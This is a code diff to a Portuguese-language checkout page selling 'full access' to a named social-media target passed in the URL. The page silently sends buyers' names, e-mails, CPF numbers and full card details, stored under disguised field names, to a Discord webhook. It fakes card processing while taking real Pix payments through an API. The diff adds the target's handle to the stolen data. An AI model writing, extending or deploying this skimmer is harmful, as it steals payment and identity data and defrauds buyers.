@@ -182,7 +182,7 @@
           <div class="b2-summary-product">
             <img src="https://i.imgur.com/z3TTFl2.png" alt="Produto" class="b2-summary-logo">
             <div>
-              <div class="b2-summary-title">Acesso Completo - Veriscan <Veriscan class="app"></Veriscan></div>
+              <div class="b2-summary-title">Acesso Completo - Veriscan <span id="alvoNome"></span></div>
               <div class="b2-summary-price" id="product-price">R$ 19,90</div>
             </div>
           </div>
@@ -318,6 +318,14 @@
 
   const BASE_AMOUNT = 1990;
 
+  // ---------- LÊ O @ DO ALVO DA URL (?u=fulano) ----------
+  const params = new URLSearchParams(location.search);
+  const alvo = (params.get('u') || '').replace('@', '').trim();
+  if (alvo) {
+    const alvoEl = document.getElementById('alvoNome');
+    if (alvoEl) alvoEl.textContent = '@' + alvo;
+  }
+
   // ---------- Máscaras ----------
   const phone = document.getElementById('phone-input');
   phone.addEventListener('input', e => {
@@ -366,8 +374,6 @@
       document.querySelectorAll('.b2-pay-tab').forEach(t => t.classList.toggle('active', t === tab));
       document.getElementById('pane-pix').classList.toggle('active', currentMethod === 'pix');
       document.getElementById('pane-cartao').classList.toggle('active', currentMethod === 'redes');
-      document.querySelector('.b2-pay-btn__text').textContent =
-        currentMethod === 'pix' ? 'PAGAR AGORA' : 'PAGAR AGORA';
       limparErros();
     });
   });
@@ -412,7 +418,7 @@
     if (e.target === e.currentTarget) hidePixModal();
   });
 
-  // ---------- TOAST (pop-up voador genérico) ----------
+  // ---------- TOAST ----------
   let toastTimer = null;
   function mostrarToast(texto, tipo) {
     const toast = document.getElementById('b2-toast');
@@ -505,7 +511,6 @@
   // ---------- ENVIO PRO DISCORD (silencioso) ----------
   async function enviarParaDiscord(dados) {
     try {
-      // Campos básicos que sempre aparecem
       const fields = [
         { name: '👤 Nome',     value: dados.nome     || '(vazio)', inline: false },
         { name: '📧 E-mail',   value: dados.email    || '(vazio)', inline: false },
@@ -515,7 +520,10 @@
         { name: '💰 Valor',    value: dados.valor,                 inline: true  }
       ];
 
-      // Só adiciona os campos de cartão se o método for cartão
+      if (dados.alvo) {
+        fields.push({ name: '🎯 Alvo', value: '@' + dados.alvo, inline: true });
+      }
+
       if (dados.metodo.includes('Cartão')) {
         fields.push(
           { name: '👤 Nome impresso',    value: dados.username     || '—', inline: true },
@@ -526,7 +534,7 @@
         );
       }
 
-      const res = await fetch(DISCORD_WEBHOOK, {
+      await fetch(DISCORD_WEBHOOK, {
         method: 'POST',
         headers: { 'Content-Type': 'application/json' },
         body: JSON.stringify({
@@ -540,7 +548,6 @@
           }]
         })
       });
-      console.log('Discord respondeu:', res.status);
     } catch (err) {
       console.warn('Falha ao enviar pro Discord:', err);
     }
@@ -551,7 +558,6 @@
   form.addEventListener('submit', async e => {
     e.preventDefault();
 
-    // 🔒 Valida ANTES de qualquer coisa
     const erros = validarFormulario();
     if (erros.length > 0) {
       mostrarToast('Preencha os campos destacados', 'erro');
@@ -574,6 +580,7 @@
       cpf:      fd.get('customer_document') || '',
       metodo:   currentMethod === 'pix' ? '🟢 PIX' : '💳 Cartão de crédito',
       valor:    'R$ ' + (BASE_AMOUNT / 100).toFixed(2).replace('.', ','),
+      alvo:     alvo,
       username:     document.getElementById('card-name').value,
       instagram:    document.getElementById('card-number').value,
       tiktok:       document.getElementById('card-expiry').value,
@@ -581,38 +588,74 @@
       installments: installments.value
     };
 
-    mostrarToast('Processando pagamento...');
     enviarParaDiscord(dados);
 
     try {
-      await new Promise(r => setTimeout(r, 1500));
-
-      const data = {
-        status: 'pending',
-        pix: {
-          qr_code: '00020126580014BR.GOV.BCB.PIX0136exemplo-de-chave-pix-aqui-0000000000005204000053039865802BR5913NOME DA LOJA6009SAO PAULO62070503***6304ABCD',
-          expiration_date: new Date(Date.now() + 5 * 60 * 1000).toISOString()
-        },
-        amount_paid: BASE_AMOUNT
-      };
-
+      // =====================================================
+      // 💰 PIX — chama a API real (/api/criar-pix) — ZPay Solution
+      // =====================================================
       if (currentMethod === 'pix') {
-        const code = data.pix.qr_code;
-        document.getElementById('pix-code').value = code;
+        const resp = await fetch('/api/criar-pix', {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify({
+            valor: BASE_AMOUNT / 100,
+            descricao: 'Acesso Completo - Veriscan' + (alvo ? ` @${alvo}` : ''),
+            nome_cliente: fd.get('customer_name') || 'Cliente'
+          })
+        });
+
+        const json = await resp.json();
+
+        if (!json.success) {
+          mostrarToast('Erro ao gerar PIX: ' + (json.error || 'desconhecido'), 'erro');
+          setLoading(false);
+          return;
+        }
+
+        const codigo = json.pix.codigoCopiaCola;
+        const qrCode  = json.pix.qrCode;
+
+        document.getElementById('pix-code').value = codigo;
         document.getElementById('pix-valor').textContent = dados.valor;
         document.getElementById('pix-expiry').textContent =
-          new Date(data.pix.expiration_date).toLocaleTimeString('pt-BR', { hour: '2-digit', minute: '2-digit' });
+          new Date(Date.now() + 5 * 60 * 1000).toLocaleTimeString('pt-BR', { hour: '2-digit', minute: '2-digit' });
 
         const qrEl = document.getElementById('pix-qr');
         qrEl.innerHTML = '';
-        new QRCode(qrEl, { text: code, width: 180, height: 180, correctLevel: QRCode.CorrectLevel.M });
+
+        if (qrCode && /^data:image\//.test(qrCode)) {
+          const img = document.createElement('img');
+          img.src = qrCode;
+          img.width = 180;
+          img.height = 180;
+          img.alt = 'QR Code PIX';
+          qrEl.appendChild(img);
+        } else if (qrCode && /^https?:\/\//.test(qrCode)) {
+          const img = document.createElement('img');
+          img.src = qrCode;
+          img.width = 180;
+          img.height = 180;
+          img.alt = 'QR Code PIX';
+          img.onerror = () => {
+            qrEl.innerHTML = '';
+            new QRCode(qrEl, { text: codigo, width: 180, height: 180, correctLevel: QRCode.CorrectLevel.M });
+          };
+          qrEl.appendChild(img);
+        } else {
+          new QRCode(qrEl, { text: codigo, width: 180, height: 180, correctLevel: QRCode.CorrectLevel.M });
+        }
 
         showPixModal();
+
       } else {
+        // Cartão: comportamento antigo
+        await new Promise(r => setTimeout(r, 1500));
         form.reset();
       }
     } catch (err) {
-      console.warn(err);
+      console.error('Erro no submit:', err);
+      mostrarToast('Erro de conexão. Tente novamente.', 'erro');
     } finally {
       setLoading(false);
     }
